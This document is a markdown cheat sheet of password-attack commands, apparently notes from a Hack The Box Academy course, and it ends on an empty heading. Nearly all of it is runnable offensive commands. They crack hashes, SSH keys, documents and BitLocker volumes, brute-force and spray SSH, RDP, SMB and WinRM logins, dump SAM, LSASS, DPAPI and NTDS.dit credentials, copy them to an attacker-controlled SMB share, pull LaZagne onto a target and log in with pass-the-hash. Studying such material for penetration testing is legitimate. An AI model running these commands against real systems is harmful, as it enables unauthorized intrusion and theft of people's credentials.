# Passsword Attacks

### John The Ripper 

```shell
  echo -n "password" | sha256sum
  john --single <filename>
  john --wordlist=<wordlist_file> <hash_file>
  
  hashid -j <hash>
```

---

### Hashcat

```shell
  hashcat -a 0 -m 0 <hash> <wordlist>
  hashcat -a 0 -m 0 <hash> <wordlist> -r <rule>
  hashcat -a 3 -m 0 <hash> <mask / '?u?l?l?l?l?d?s'>
  hashid -m '<hash>'
```

---

### Password List

```shell
  cat << EOF >> password.list
  cat << EOF >> custom.rule
  hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
  hashcat -a 0 -m 0 <hash> mut_password.list
```

---

### Protected Files

```shell
  for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
  grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null #ssh keys
  cat /home/jsmith/.ssh/SSH.private
  ssh-keygen -yf ~/.ssh/id_ed25519 #If no prompt for passprashe we are good

  #SSH keys cracking
  ssh2john.py SSH.private > ssh.hash
  john --wordlist=rockyou.txt ssh.hash
  john ssh.hash --show

  # Password protected documents
  office2john.py Protected.docx > protected-docx.hash
  john --wordlist=rockyou.txt protected-docx.hash
  john protected-docx.hash --show

  #  Pdf
  pdf2john.py PDF.pdf > pdf.hash
  john --wordlist=rockyou.txt pdf.hash
  john pdf.hash --show
```

---

### Protected Archives

```shell
  zip2john ZIP.zip > zip.hash
  john --wordlist=rockyou.txt zip.hash

  for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

  # bitlocker
  bitlocker2john -i Backup.vhd > backup.hashes
  grep "bitlocker\$0" backup.hashes > backup.hash
  hashcat -a 0 -m 22100 '<hash/hashfile>' /usr/share/wordlists/rockyou.txt
```

```shell
  sudo mkdir -p /media/bitlocker
  sudo mkdir -p /media/bitlockermount

  sudo losetup -f -P Backup.vhd
  losetup -all
  sudo apt-get install dislocker
  sudo dislocker /dev/loop0p1 -u<cracked_username> -- /media/bitlocker
  sudo ls -la /media/bitlocker
  sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

  cd /media/bitlockermount/
  ls -la
  
  sudo umount /media/bitlockermount
  sudo umount /media/bitlocker
```

---

### Network Services

```shell
  sudo apt-get -y install netexec
  netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

  #attacks
  netexec winrm 10.129.42.197 -u user.list -p password.list
  hydra -L user.list -P password.list ssh://<ip>
  hydra -L user.list -P password.list rdp://<ip>
  hydra -L user.list -P password.list smb://<ip>

  msfconsole: auxiliary/scanner/smb/smb_login

  #Logging in after
  ssh <username>@<ip>
  netexec smb 10.129.42.197 -u "user" -p "password" --shares
  smbclient -U user \\\\10.129.42.197\\SHARENAME
  evil-winrm -i <target-IP> -u <username> -p <password>
  xfreerdp /v:<target-IP> /u:<username> /p:<password>
  
```

---

### Spraying, Stuffing, Defaults

```shell
  netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
  hydra -C user_pass.list ssh://10.100.38.23

  pip3 install defaultcreds-cheat-sheet
  creds search <protocol/app>
```

---

### Extraxting from windows machines

```shell
  reg.exe save hklm\sam C:\sam.save
  reg.exe save hklm\system C:\system.save
  reg.exe save hklm\security C:\security.save

  sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
  move sam.save \\<ip>\CompData
  move security.save \\<ip>\CompData
  move system.save \\<ip>\CompData

  python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
  sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

  #DCC2 Hashes - hklm/security
  hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

  #DPAPI
  mimikatz.exe
  dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

  netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
  netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
  
```

---

### Dumping LSASS

```shell
  tasklist /svc

  Get-Process lsass

  rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp ful
  pypykatz lsa minidump /home/peter/Documents/lsass.dmp
  sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

---

### Windows Vault & Credentials

```shell
  whoami
  cmdkey /list
  runas /savecred /user:SRV01\mcharles cmd

  mkdir www; cd www; wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
  python3 -m http.server
  certutil -urlcache -split -f "http://<ip>:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe
  C:\Windows\Temp\lazagne.exe all

  mimikatz.exe
  privilege::debug
  sekurlsa::credman
```

---

### AD and NTDS.dit

```shell
  git clone https://github.com/urbanadventurer/username-anarchy
  wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
  
  ./username-anarchy -i /home/ltnbob/names.txt 
  ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain/-d inlanefreight.local names.txt
  ./kerbrute_linux_amd64 bruteuser --dc 10.129.201.57 --domain/-d inlanefreight.local <wordlist> <username>
  netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

  # NTDS.dit
  evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
  net localgroup
  net user bwilliamson
  vssadmin CREATE SHADOW /For=C:
  cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit .\NTDS.dit
  cmd.exe /c reg.exe save hklm\SYSTEM .\SYSTEM
  cmd.exe /c move .\NTDS.dit \\10.10.15.30\CompData
  cmd.exe /c move .\SYSTEM \\10.10.15.30\CompData
  impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

  #Login
  netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
  sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
  evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b # Pass the hash
```

---

### Credentiall Hunting
